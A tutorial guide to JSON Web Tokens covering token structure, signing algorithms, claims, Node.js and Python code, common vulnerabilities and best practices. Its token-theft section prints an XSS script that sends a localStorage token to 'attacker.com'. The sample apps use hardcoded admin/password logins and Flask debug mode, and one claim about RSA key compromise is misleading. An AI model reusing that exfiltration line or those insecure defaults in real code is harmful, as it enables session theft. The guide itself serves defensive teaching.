# JSON Web Token (JWT) - Comprehensive Guide

## **Introduction**

JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed.

### **What JWT is Used For**

JWTs are commonly used for:

- **Authentication**: Verifying user identity
- **Authorization**: Determining user permissions and roles
- **Information Exchange**: Securely transmitting data between parties
- **Session Management**: Stateless session tokens
- **API Authentication**: Authenticating API requests
- **Single Sign-On (SSO)**: Sharing authentication between multiple applications

### **Why Use JWT?**

**Advantages:**

- ✅ **Stateless**: No need to store session data on server
- ✅ **Scalable**: Works across multiple servers without shared storage
- ✅ **Self-contained**: Includes all necessary information
- ✅ **Cross-domain**: Can be used across different domains
- ✅ **Standardized**: Industry-standard format (RFC 7519)
- ✅ **Compact**: Small size, easy to transmit

**Disadvantages:**

- ⚠️ **Larger size**: More data than simple session IDs
- ⚠️ **Cannot revoke easily**: Difficult to invalidate before expiration
- ⚠️ **Security depends on implementation**: Must be implemented correctly
- ⚠️ **Token theft risk**: If stolen, can be used until expiration

---

## **What is JWT**

### **Definition**

A JWT is a compact, URL-safe token that consists of three parts separated by dots (`.`):

```
header.payload.signature

```

**Example:**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMiLCJ1c2VybmFtZSI6ImpvaG4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

```

### **Key Characteristics**

1. **Compact**: Small size makes it easy to transmit via URL, POST parameter, or HTTP header
2. **Self-contained**: Contains all necessary information (claims) about the user
3. **Stateless**: Server doesn't need to store session data
4. **Signed**: Digitally signed to ensure integrity and authenticity

---

## **JWT Structure**

A JWT consists of three parts:

### **1. Header**

The header typically consists of two parts:

- **Type (typ)**: Usually "JWT"
- **Algorithm (alg)**: The signing algorithm (e.g., HS256, RS256, ES256)

**Example Header:**

```json
{
  "alg": "HS256",
  "typ": "JWT"
}

```

**Encoded:**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

```

### **2. Payload**

The payload contains the **claims**. Claims are statements about an entity (typically the user) and additional data.

**Types of Claims:**

- **Registered Claims**: Pre-defined claims (exp, iat, iss, aud, etc.)
- **Public Claims**: Claims defined in the JWT registry
- **Private Claims**: Custom claims specific to your application

**Example Payload:**

```json
{
  "userId": "123",
  "username": "john",
  "email": "john@example.com",
  "role": "admin",
  "iat": 1516239022,
  "exp": 1516242622
}

```

**Encoded:**

```
eyJ1c2VySWQiOiIxMjMiLCJ1c2VybmFtZSI6ImpvaG4iLCJlbWFpbCI6ImpvaG5AZXhhbXBsZS5jb20iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE1MTYyMzkwMjIsImV4cCI6MTUxNjI0MjYyMn0

```

### **3. Signature**

The signature is created using:

- The encoded header
- The encoded payload
- A secret (for HMAC) or private key (for RSA/ECDSA)
- The algorithm specified in the header

**For HMAC SHA256:**

```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)

```

**Complete JWT:**

```
header.payload.signature

```

---

## **How JWT Works**

### **JWT Authentication Flow**

```
1. User Login
   ┌─────────┐
   │  User   │
   └────┬────┘
        │ 1. Sends credentials
        ▼
   ┌─────────────┐
   │   Server    │
   └────┬────────┘
        │ 2. Validates credentials
        │ 3. Creates JWT with user claims
        │ 4. Signs JWT with secret key
        ▼
   ┌─────────────────┐
   │  JWT Token      │
   │  (sent to user) │
   └─────────────────┘

2. Accessing Protected Resources
   ┌─────────┐
   │  User   │
   └────┬────┘
        │ 5. Sends request with JWT in Authorization header
        ▼
   ┌─────────────┐
   │   Server    │
   └────┬────────┘
        │ 6. Verifies JWT signature
        │ 7. Validates claims (exp, iat, etc.)
        │ 8. Extracts user information from payload
        │ 9. Grants/denies access
        ▼
   ┌─────────────┐
   │  Response   │
   └─────────────┘

```

### **Step-by-Step Process**

1. **User Authentication**
    - User provides credentials (username/password)
    - Server validates credentials
    - If valid, server creates JWT
2. **JWT Creation**
    - Server creates header with algorithm
    - Server creates payload with user claims
    - Server signs token using secret key
    - Server sends JWT to client (usually in response body or cookie)
3. **Token Storage (Client)**
    - Client stores JWT (localStorage, sessionStorage, or httpOnly cookie)
    - Client includes JWT in subsequent requests
4. **Request Authorization**
    - Client sends request with JWT in `Authorization: Bearer <token>` header
    - Server receives request and extracts JWT
5. **Token Verification**
    - Server verifies signature using secret key
    - Server validates claims (expiration, issuer, audience, etc.)
    - Server extracts user information from payload
6. **Authorization**
    - Server checks user permissions/roles from token claims
    - Server grants or denies access to requested resource

---

## **JWT Algorithms**

### **Algorithm Types**

JWTs support several signing algorithms:

### **1. HMAC (Symmetric)**

**Algorithms:**

- `HS256`: HMAC using SHA-256
- `HS384`: HMAC using SHA-384
- `HS512`: HMAC using SHA-512

**Full Name:** Hash-based Message Authentication Code

**How it works:**

- Same secret key used for signing and verification
- Secret key must be shared between all parties

**Example:**

```jsx
// Secret key (same for signing and verifying)
const secret = 'your-secret-key';

// Sign
const token = jwt.sign(payload, secret, { algorithm: 'HS256' });

// Verify
const decoded = jwt.verify(token, secret, { algorithms: ['HS256'] });

```

**Use Cases:**

- Single-server applications
- When secret key can be securely shared
- Simple authentication scenarios

**Security:**

- ✅ Fast and efficient
- ⚠️ Secret key compromise affects all tokens
- ⚠️ Key must be securely stored and shared

### **2. RSA (Asymmetric)**

**Algorithms:**

- `RS256`: RSASSA-PKCS1-v1_5 using SHA-256
- `RS384`: RSASSA-PKCS1-v1_5 using SHA-384
- `RS512`: RSASSA-PKCS1-v1_5 using SHA-512

**Full Name:** Rivest-Shamir-Adleman

**How it works:**

- Private key used for signing (kept secret)
- Public key used for verification (can be shared)

**Example:**

```jsx
const fs = require('fs');

// Load keys
const privateKey = fs.readFileSync('private.pem', 'utf8');
const publicKey = fs.readFileSync('public.pem', 'utf8');

// Sign with private key
const token = jwt.sign(payload, privateKey, { algorithm: 'RS256' });

// Verify with public key
const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256'] });

```

**Use Cases:**

- Multi-server applications
- Microservices architecture
- When verification needs to be done without secret key access

**Security:**

- ✅ Private key compromise doesn't affect verification
- ✅ Public key can be distributed widely
- ⚠️ Slower than HMAC
- ⚠️ Requires key pair management

### **3. ECDSA (Elliptic Curve)**

**Algorithms:**

- `ES256`: ECDSA using P-256 and SHA-256
- `ES384`: ECDSA using P-384 and SHA-384
- `ES512`: ECDSA using P-521 and SHA-512

**Full Name:** Elliptic Curve Digital Signature Algorithm

**How it works:**

- Similar to RSA but uses elliptic curve cryptography
- Smaller keys for same security level
- Private key for signing, public key for verification

**Example:**

```jsx
const fs = require('fs');

// Load keys
const privateKey = fs.readFileSync('ec-private.pem', 'utf8');
const publicKey = fs.readFileSync('ec-public.pem', 'utf8');

// Sign with private key
const token = jwt.sign(payload, privateKey, { algorithm: 'ES256' });

// Verify with public key
const decoded = jwt.verify(token, publicKey, { algorithms: ['ES256'] });

```

**Use Cases:**

- Modern applications requiring efficient cryptography
- Mobile applications (smaller key size)
- IoT devices (resource constraints)

**Security:**

- ✅ Smaller keys than RSA for same security
- ✅ Faster than RSA
- ✅ Strong security with smaller keys
- ⚠️ Requires key pair management

### **Algorithm Selection Guide**

| Algorithm | Type | Key Size | Speed | Use Case |
| --- | --- | --- | --- | --- |
| HS256 | Symmetric | 256+ bits | Fast | Single server, simple auth |
| RS256 | Asymmetric | 2048+ bits | Medium | Multi-server, microservices |
| ES256 | Asymmetric | 256 bits | Fast | Modern apps, mobile, IoT |

**⚠️ CRITICAL: Never use algorithm 'none'**

- The 'none' algorithm means no signature
- Extremely dangerous - allows token forgery
- Always whitelist algorithms explicitly

---

## **JWT Claims**

Claims are statements about an entity and additional metadata. There are three types of claims:

### **1. Registered Claims**

These are pre-defined claims in the JWT specification:

| Claim | Name | Description | Example |
| --- | --- | --- | --- |
| `iss` | Issuer | Entity that issued the JWT | `"iss": "https://api.example.com"` |
| `sub` | Subject | Subject of the JWT (usually user ID) | `"sub": "1234567890"` |
| `aud` | Audience | Intended recipient of the JWT | `"aud": "my-app"` |
| `exp` | Expiration Time | Token expiration time (Unix timestamp) | `"exp": 1516242622` |
| `nbf` | Not Before | Token not valid before this time | `"nbf": 1516239022` |
| `iat` | Issued At | Time when token was issued | `"iat": 1516239022` |
| `jti` | JWT ID | Unique identifier for the JWT | `"jti": "550e8400-e29b-41d4-a716-446655440000"` |

**Example:**

```json
{
  "iss": "https://api.example.com",
  "sub": "1234567890",
  "aud": "my-app",
  "exp": 1516242622,
  "nbf": 1516239022,
  "iat": 1516239022,
  "jti": "550e8400-e29b-41d4-a716-446655440000"
}

```

### **2. Public Claims**

Claims defined in the JWT registry or defined as URIs:

**Example:**

```json
{
  "email": "user@example.com",
  "email_verified": true,
  "name": "John Doe"
}

```

### **3. Private Claims**

Custom claims specific to your application:

**Common Private Claims:**

- `userId`: User identifier
- `username`: Username
- `role`: User role (admin, user, etc.)
- `permissions`: Array of permissions
- `department`: User's department
- Custom business logic data

**Example:**

```json
{
  "userId": "123",
  "username": "john",
  "role": "admin",
  "permissions": ["read", "write", "delete"],
  "department": "engineering"
}

```

### **⚠️ Important: What NOT to Store in Claims**

**Never store sensitive information:**

- ❌ Passwords or password hashes
- ❌ Credit card numbers
- ❌ Social Security Numbers (SSN)
- ❌ Private keys or secrets
- ❌ Full personal addresses
- ❌ Medical records

**Keep payload minimal:**

- ✅ Only store what's necessary for authorization
- ✅ Store identifiers, not full user objects
- ✅ Follow principle of least privilege

---

## **Creating and Verifying JWTs**

### **Creating a JWT**

### **Node.js (jsonwebtoken library)**

```jsx
const jwt = require('jsonwebtoken');

// Payload
const payload = {
  userId: '123',
  username: 'john',
  role: 'admin',
  iat: Math.floor(Date.now() / 1000),
  exp: Math.floor(Date.now() / 1000) + (60 * 60) // 1 hour
};

// Secret key (for HMAC)
const secret = process.env.JWT_SECRET;

// Create token
const token = jwt.sign(payload, secret, {
  algorithm: 'HS256',
  expiresIn: '1h',
  issuer: 'my-api',
  audience: 'my-app'
});

console.log('Token:', token);

```

### **Python (PyJWT library)**

```python
import jwt
import datetime

# Payload
payload = {
    'userId': '123',
    'username': 'john',
    'role': 'admin',
    'iat': datetime.datetime.utcnow(),
    'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=1)
}

# Secret key
secret = os.getenv('JWT_SECRET')

# Create token
token = jwt.encode(payload, secret, algorithm='HS256')
print(f'Token: {token}')

```

### **Verifying a JWT**

### **Node.js**

```jsx
const jwt = require('jsonwebtoken');

const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...';
const secret = process.env.JWT_SECRET;

try {
  // Verify and decode
  const decoded = jwt.verify(token, secret, {
    algorithms: ['HS256'],  // Whitelist algorithms
    issuer: 'my-api',       // Validate issuer
    audience: 'my-app',     // Validate audience
    maxAge: '2h'            // Maximum age
  });

  console.log('Decoded payload:', decoded);
  // Use decoded.userId, decoded.role, etc.

} catch (error) {
  if (error.name === 'TokenExpiredError') {
    console.error('Token has expired');
  } else if (error.name === 'JsonWebTokenError') {
    console.error('Invalid token');
  } else {
    console.error('Token verification failed:', error.message);
  }
}

```

### **Python**

```python
import jwt

token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'
secret = os.getenv('JWT_SECRET')

try:
    # Verify and decode
    decoded = jwt.decode(
        token,
        secret,
        algorithms=['HS256'],  # Whitelist algorithms
        issuer='my-api',       # Validate issuer
        audience='my-app',     # Validate audience
        options={'verify_exp': True}
    )

    print(f'Decoded payload: {decoded}')

except jwt.ExpiredSignatureError:
    print('Token has expired')
except jwt.InvalidTokenError:
    print('Invalid token')

```

### **Decoding Without Verification (Dangerous!)**

```jsx
// ❌ WRONG: Decoding without verification
const decoded = jwt.decode(token);
// This does NOT verify the signature!
// Never trust claims from decode() alone

// ✅ CORRECT: Always verify
const decoded = jwt.verify(token, secret, { algorithms: ['HS256'] });

```

---

## **JWT Security Considerations**

### **1. Token Storage**

**Options:**

### **localStorage**

- ✅ Easy to access in JavaScript
- ❌ Vulnerable to XSS attacks
- ❌ Accessible to any script on the page

### **sessionStorage**

- ✅ Cleared when tab closes
- ❌ Still vulnerable to XSS
- ❌ Not accessible across tabs

### **httpOnly Cookies**

- ✅ Not accessible to JavaScript (XSS protection)
- ✅ Automatically sent with requests
- ⚠️ Vulnerable to CSRF (use SameSite attribute)
- ✅ Recommended for sensitive tokens

### **Memory (JavaScript variable)**

- ✅ Not persisted
- ✅ Not accessible after page reload
- ❌ Lost on page refresh

**Recommendation:**

- Use **httpOnly cookies** for access tokens
- Use **httpOnly cookies** with `SameSite=Strict` or `SameSite=Lax`
- Add `Secure` flag for HTTPS-only transmission

### **2. Token Transmission**

**Always use HTTPS:**

- JWTs contain sensitive information
- HTTPS encrypts data in transit
- Prevents man-in-the-middle attacks

**Authorization Header (Recommended):**

```jsx
fetch('https://api.example.com/protected', {
  headers: {
    'Authorization': `Bearer ${token}`
  }
});

```

**Cookie (Alternative):**

```jsx
// Set cookie with httpOnly flag
res.cookie('token', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 3600000
});

```

### **3. Token Expiration**

**Short-lived Access Tokens:**

- Recommended: 15 minutes to 1 hour
- Reduces risk if token is stolen
- Forces regular refresh

**Long-lived Refresh Tokens:**

- Stored securely (httpOnly cookie)
- Used to obtain new access tokens
- Can be revoked server-side
- Recommended: 7-30 days

**Refresh Token Flow:**

```
1. User logs in
   → Server returns: accessToken (15min) + refreshToken (7days)

2. Access token expires
   → Client sends refreshToken to /refresh endpoint
   → Server validates refreshToken
   → Server returns new accessToken

3. Refresh token expires
   → User must login again

```

### **4. Secret Key Management**

**Key Requirements:**

- ✅ Long and random (minimum 256 bits for HMAC)
- ✅ Cryptographically secure random generation
- ✅ Stored securely (environment variables, secret managers)
- ✅ Never committed to version control
- ✅ Rotated periodically

**Key Generation:**

```jsx
// Generate secure random key
const crypto = require('crypto');
const secretKey = crypto.randomBytes(64).toString('hex');
// 128 characters (512 bits)

// Or use crypto.randomBytes directly
const secretKey = crypto.randomBytes(32); // 256 bits

```

**Key Storage:**

```jsx
// ✅ Use environment variables
const secret = process.env.JWT_SECRET;

// ✅ Use secret management services
// - AWS Secrets Manager
// - HashiCorp Vault
// - Azure Key Vault
// - Google Cloud Secret Manager

```

### **5. Algorithm Whitelisting**

**Always explicitly whitelist algorithms:**

```jsx
// ✅ CORRECT: Whitelist algorithms
jwt.verify(token, secret, {
  algorithms: ['HS256', 'RS256']  // Only allow these
});

// ❌ WRONG: May allow 'none' algorithm
jwt.verify(token, secret);  // Dangerous!

```

### **6. Claim Validation**

**Always validate all claims:**

```jsx
jwt.verify(token, secret, {
  algorithms: ['HS256'],
  issuer: 'my-api',        // Validate issuer
  audience: 'my-app',      // Validate audience
  maxAge: '2h',            // Maximum age from iat
  clockTolerance: 60       // Allow 60 seconds clock skew
});

```

---

## **Common Vulnerabilities and Mitigations**

### **1. Information Leakage**

**Problem:** Sensitive information stored in JWT payload can be decoded by anyone.

**Example:**

```json
{
  "userId": "123",
  "password": "hashed_password",  // ❌ Never store!
  "creditCard": "1234-5678-9012-3456",  // ❌ Never store!
  "ssn": "123-45-6789"  // ❌ Never store!
}

```

**Mitigation:**

- ✅ Store only necessary identifiers
- ✅ Never store passwords, PII, or sensitive data
- ✅ Use principle of least privilege
- ✅ Use JWE (JSON Web Encryption) if encryption is needed

### **2. Algorithm Confusion Attack**

**Problem:** Server accepts tokens signed with different algorithms (e.g., 'none' or weak algorithms).

**Example:**

```jsx
// Attacker changes algorithm to 'none'
{
  "alg": "none",  // Changed from HS256
  "typ": "JWT"
}

```

**Mitigation:**

- ✅ Always whitelist algorithms explicitly
- ✅ Never allow 'none' algorithm
- ✅ Use strong algorithms (HS256, RS256, ES256)

### **3. Token Theft**

**Problem:** If token is stolen (XSS, network sniffing, etc.), attacker can use it until expiration.

**Example:**

```jsx
// XSS attack steals token from localStorage
<script>
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'));
</script>

```

**Mitigation:**

- ✅ Use httpOnly cookies instead of localStorage
- ✅ Use short token expiration times
- ✅ Implement token refresh mechanism
- ✅ Use HTTPS for all token transmission
- ✅ Implement Content Security Policy (CSP)
- ✅ Implement token blacklisting (optional, requires storage)

### **4. Replay Attacks**

**Problem:** Valid token can be reused multiple times even after action is completed.

**Example:**

```jsx
// Attacker intercepts valid token
// Reuses it multiple times to perform actions

```

**Mitigation:**

- ✅ Use short token expiration
- ✅ Implement `jti` (JWT ID) claim for one-time tokens
- ✅ Use `nonce` for critical operations
- ✅ Implement token blacklisting for critical operations

### **5. Token Expiration Not Validated**

**Problem:** Server doesn't validate expiration claim, allowing expired tokens.

**Example:**

```jsx
// ❌ WRONG: No expiration check
const decoded = jwt.decode(token);  // Doesn't validate exp

```

**Mitigation:**

- ✅ Always use `jwt.verify()` instead of `jwt.decode()`
- ✅ Verify `exp` claim automatically (built into jwt.verify)
- ✅ Validate `iat` and `nbf` claims
- ✅ Implement clock synchronization

### **6. Weak Secret Keys**

**Problem:** Short or predictable secret keys can be brute-forced.

**Example:**

```jsx
// ❌ WRONG: Weak key
const secret = "password123";  // Too short and predictable

```

**Mitigation:**

- ✅ Use long, random keys (minimum 256 bits)
- ✅ Generate keys using cryptographically secure random generators
- ✅ Store keys securely (environment variables, secret managers)
- ✅ Rotate keys periodically

### **7. Insufficient Claim Validation**

**Problem:** Server doesn't validate all claims, allowing token manipulation.

**Example:**

```jsx
// ❌ WRONG: Only checks signature
const decoded = jwt.verify(token, secret);
// Doesn't validate issuer, audience, etc.

```

**Mitigation:**

- ✅ Validate all claims (iss, aud, exp, iat, nbf)
- ✅ Validate custom claims (roles, permissions)
- ✅ Implement proper authorization checks
- ✅ Use claim validation libraries

### **8. Key Management Issues**

**Problem:** Secret keys are compromised, hardcoded, or improperly managed.

**Example:**

```jsx
// ❌ WRONG: Hardcoded key
const secret = "my-secret-key";  // In source code!

// ❌ WRONG: Key in version control
// config.json committed to Git

```

**Mitigation:**

- ✅ Never hardcode keys in source code
- ✅ Use environment variables
- ✅ Use secret management services
- ✅ Implement key rotation
- ✅ Use different keys for different environments
- ✅ Never commit keys to version control

---

## **Best Practices**

### **1. Use Secure Connection (HTTPS)**

```jsx
// ✅ Always use HTTPS
// ❌ Never send JWT over HTTP

```

### **2. Never Transfer Sensitive Information**

```jsx
// ✅ Only include necessary claims
const payload = {
  userId: '123',
  role: 'admin'
  // No passwords, PII, or sensitive data
};

```

### **3. Limit JWT Lifespan**

```jsx
// ✅ Short-lived access tokens
jwt.sign(payload, secret, { expiresIn: '15m' });

// ✅ Use refresh tokens for longer sessions

```

### **4. Use Long Key Passphrase**

```jsx
// ✅ Generate long, random key
const secret = crypto.randomBytes(64).toString('hex');
// 128 characters (512 bits)

```

### **5. Whitelist Authorized Signature Algorithms**

```jsx
// ✅ Always whitelist algorithms
jwt.verify(token, secret, {
  algorithms: ['HS256']  // Explicit whitelist
});

```

### **6. Work with One Signature Algorithm Ideally**

```jsx
// ✅ Consistent algorithm usage
// Use HS256 throughout the application
// Or RS256 throughout the application

```

### **7. Choose Well-Known and Reliable Libraries**

**Recommended Libraries:**

- **Node.js**: `jsonwebtoken` (node-jsonwebtoken)
- **Python**: `PyJWT`
- **Java**: `java-jwt` (auth0)
- **C#**: `System.IdentityModel.Tokens.Jwt`
- **Go**: `github.com/golang-jwt/jwt`

### **8. Always Validate and Sanitize Data**

```jsx
// ✅ Validate all claims
jwt.verify(token, secret, {
  algorithms: ['HS256'],
  issuer: 'my-api',
  audience: 'my-app'
});

// ✅ Validate custom claims
if (!decoded.role || !['admin', 'user'].includes(decoded.role)) {
  throw new Error('Invalid role');
}

```

### **9. Use httpOnly Cookies for Storage**

```jsx
// ✅ Store in httpOnly cookie
res.cookie('token', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 3600000
});

```

### **10. Implement Token Refresh Mechanism**

```jsx
// ✅ Short access token + long refresh token
const accessToken = jwt.sign(payload, secret, { expiresIn: '15m' });
const refreshToken = jwt.sign({ userId: payload.userId }, secret, { expiresIn: '7d' });

```

---

## **Implementation Examples**

### **Node.js/Express - Complete Example**

```jsx
const express = require('express');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

const app = express();
app.use(express.json());

// Secret key (from environment variable)
const JWT_SECRET = process.env.JWT_SECRET || crypto.randomBytes(64).toString('hex');

// Login endpoint
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  // Validate credentials (simplified)
  if (username === 'admin' && password === 'password') {
    // Create payload
    const payload = {
      userId: '123',
      username: username,
      role: 'admin',
      iat: Math.floor(Date.now() / 1000)
    };

    // Create access token (15 minutes)
    const accessToken = jwt.sign(payload, JWT_SECRET, {
      algorithm: 'HS256',
      expiresIn: '15m',
      issuer: 'my-api',
      audience: 'my-app'
    });

    // Create refresh token (7 days)
    const refreshToken = jwt.sign(
      { userId: payload.userId },
      JWT_SECRET,
      {
        algorithm: 'HS256',
        expiresIn: '7d',
        issuer: 'my-api'
      }
    );

    // Send tokens in httpOnly cookies
    res.cookie('accessToken', accessToken, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      maxAge: 15 * 60 * 1000  // 15 minutes
    });

    res.cookie('refreshToken', refreshToken, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60 * 1000  // 7 days
    });

    res.json({ success: true });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// Middleware to verify JWT
const verifyToken = (req, res, next) => {
  const token = req.cookies.accessToken || req.headers.authorization?.split(' ')[1];

  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }

  try {
    // Verify token
    const decoded = jwt.verify(token, JWT_SECRET, {
      algorithms: ['HS256'],  // Whitelist algorithms
      issuer: 'my-api',       // Validate issuer
      audience: 'my-app',     // Validate audience
      maxAge: '2h'            // Maximum age
    });

    // Attach user info to request
    req.user = decoded;
    next();
  } catch (error) {
    if (error.name === 'TokenExpiredError') {
      return res.status(401).json({ error: 'Token expired' });
    } else if (error.name === 'JsonWebTokenError') {
      return res.status(401).json({ error: 'Invalid token' });
    } else {
      return res.status(500).json({ error: 'Token verification failed' });
    }
  }
};

// Protected route
app.get('/protected', verifyToken, (req, res) => {
  res.json({
    message: 'This is a protected route',
    user: req.user
  });
});

// Refresh token endpoint
app.post('/refresh', (req, res) => {
  const refreshToken = req.cookies.refreshToken;

  if (!refreshToken) {
    return res.status(401).json({ error: 'No refresh token provided' });
  }

  try {
    // Verify refresh token
    const decoded = jwt.verify(refreshToken, JWT_SECRET, {
      algorithms: ['HS256'],
      issuer: 'my-api'
    });

    // Create new access token
    const payload = {
      userId: decoded.userId,
      username: 'admin',  // Fetch from database
      role: 'admin',
      iat: Math.floor(Date.now() / 1000)
    };

    const accessToken = jwt.sign(payload, JWT_SECRET, {
      algorithm: 'HS256',
      expiresIn: '15m',
      issuer: 'my-api',
      audience: 'my-app'
    });

    res.cookie('accessToken', accessToken, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      maxAge: 15 * 60 * 1000
    });

    res.json({ success: true });
  } catch (error) {
    res.status(401).json({ error: 'Invalid refresh token' });
  }
});

app.listen(3000, () => {
  console.log('Server running on port 3000');
});

```

### **Python/Flask - Complete Example**

```python
from flask import Flask, request, jsonify, make_response
import jwt
import datetime
import os
import secrets

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('JWT_SECRET', secrets.token_hex(64))

def create_token(user_id, username, role):
    payload = {
        'userId': user_id,
        'username': username,
        'role': role,
        'iat': datetime.datetime.utcnow(),
        'exp': datetime.datetime.utcnow() + datetime.timedelta(minutes=15),
        'iss': 'my-api',
        'aud': 'my-app'
    }
    return jwt.encode(payload, app.config['SECRET_KEY'], algorithm='HS256')

def verify_token(token):
    try:
        decoded = jwt.decode(
            token,
            app.config['SECRET_KEY'],
            algorithms=['HS256'],
            issuer='my-api',
            audience='my-app'
        )
        return decoded
    except jwt.ExpiredSignatureError:
        raise Exception('Token expired')
    except jwt.InvalidTokenError:
        raise Exception('Invalid token')

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')

    # Validate credentials (simplified)
    if username == 'admin' and password == 'password':
        token = create_token('123', username, 'admin')

        response = make_response(jsonify({'success': True}))
        response.set_cookie(
            'accessToken',
            token,
            httponly=True,
            secure=True,
            samesite='Strict',
            max_age=15*60  # 15 minutes
        )
        return response
    else:
        return jsonify({'error': 'Invalid credentials'}), 401

@app.route('/protected', methods=['GET'])
def protected():
    token = request.cookies.get('accessToken') or \
            request.headers.get('Authorization', '').split(' ')[-1]

    if not token:
        return jsonify({'error': 'No token provided'}), 401

    try:
        decoded = verify_token(token)
        return jsonify({
            'message': 'This is a protected route',
            'user': decoded
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 401

if __name__ == '__main__':
    app.run(debug=True)

```

---

## **Real-World Scenarios**

### **Scenario 1: Single Page Application (SPA)**

**Requirements:**

- Frontend: React/Vue/Angular
- Backend: REST API
- Authentication: JWT

**Implementation:**

1. User logs in → Backend returns JWT
2. Frontend stores JWT in httpOnly cookie (via backend) or memory
3. Frontend sends JWT in Authorization header for API requests
4. Backend validates JWT on each request

**Best Practices:**

- Use httpOnly cookies set by backend (most secure)
- Or store in memory (cleared on page refresh)
- Avoid localStorage (XSS vulnerable)
- Implement token refresh mechanism

### **Scenario 2: Microservices Architecture**

**Requirements:**

- Multiple services need to verify tokens
- Services don't share secrets

**Implementation:**

1. Use RSA/ECDSA (asymmetric) algorithms
2. Auth service signs tokens with private key
3. Other services verify with public key
4. Public key distributed to all services

**Best Practices:**

- Use RS256 or ES256 algorithm
- Distribute public key securely
- Implement JWKS (JSON Web Key Set) endpoint
- Rotate keys periodically

### **Scenario 3: Mobile Application**

**Requirements:**

- iOS/Android app
- Backend API
- Secure token storage

**Implementation:**

1. User logs in → Backend returns JWT
2. App stores JWT in secure storage (Keychain/Keystore)
3. App sends JWT in Authorization header
4. Backend validates JWT

**Best Practices:**

- Use platform secure storage (Keychain/Keystore)
- Use short token expiration
- Implement token refresh
- Use HTTPS for all communication

### **Scenario 4: Third-Party API Integration**

**Requirements:**

- Your app calls third-party API
- Third-party API requires JWT authentication

**Implementation:**

1. Third-party provides API key/secret
2. Your backend creates JWT with their requirements
3. Your backend signs JWT with their secret
4. Your backend includes JWT in API requests

**Best Practices:**

- Follow third-party JWT requirements exactly
- Store third-party secrets securely
- Implement proper error handling
- Monitor token expiration

---

## **Summary**

JWTs are a powerful tool for authentication and authorization, but they must be implemented correctly to be secure. Key points to remember:

1. **Never store sensitive information** in JWT payload
2. **Always validate all claims** including expiration
3. **Use long, random secret keys** (minimum 256 bits)
4. **Whitelist algorithms** explicitly (never allow 'none')
5. **Use HTTPS** for all token transmission
6. **Store tokens securely** (httpOnly cookies preferred)
7. **Use short expiration times** with refresh tokens
8. **Choose reliable libraries** and keep them updated
9. **Validate and sanitize** all claims and data
10. **Follow security best practices** throughout implementation

Remember: **Security is not about using the right technology, but about implementing it correctly.**